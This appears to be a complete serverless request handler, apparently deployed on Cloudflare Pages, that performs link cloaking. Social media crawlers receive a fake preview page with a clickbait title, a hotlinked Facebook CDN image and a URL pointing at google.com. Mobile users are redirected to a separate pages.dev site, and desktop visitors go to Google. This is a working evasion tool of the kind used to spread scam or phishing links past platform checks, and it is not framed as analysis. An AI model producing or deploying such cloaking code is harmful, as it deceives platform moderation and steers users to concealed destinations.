export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😱YOU➔BACK➔TO➔BACK➔HIT➔MY➔LOL😱">
    <meta property="og:description" content="🤍♥️beautiful♥️🤍">
    <meta property="og:image" content="https://igcdn-origincache-internal-services-all.fbcdn.net/v/t1.15752-9/823697071_923732674152364_6410154245937129543_n.jpg?stp=dst-jpg_s640x640_tt6&_nc_cat=100&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=0024fc&_nc_eui2=AeGC8fyBGU8c6hr6l8gRlHY5OyXidDbvbvU7JeJ0Nu9u9YX2G3477GykmEENrlt7b_rFknTSxMb2qprIbNk9tCnD&_nc_ohc=7qnBB2aY0n0Q7kNvwEpqUzG&_nc_oc=AdrESTe76qXkBKsdcLkg7knmi78CHjWduJ_p3qQt6MWi_IGzI51Xo0OeC0x96Y9PAaE&_nc_ad=z-m&_nc_cid=0&_nc_zt=23&_nc_ht=scontent.flyp17-1.fna&_nc_ss=7a22e&oh=03_Q7cD6QE5sSnuqNlbQ0qvJe0O5YhXg95NUPTNJ85jv8t-NZ1CdA&oe=6ADC9F75">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://lota-pro-max1.pages.dev", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
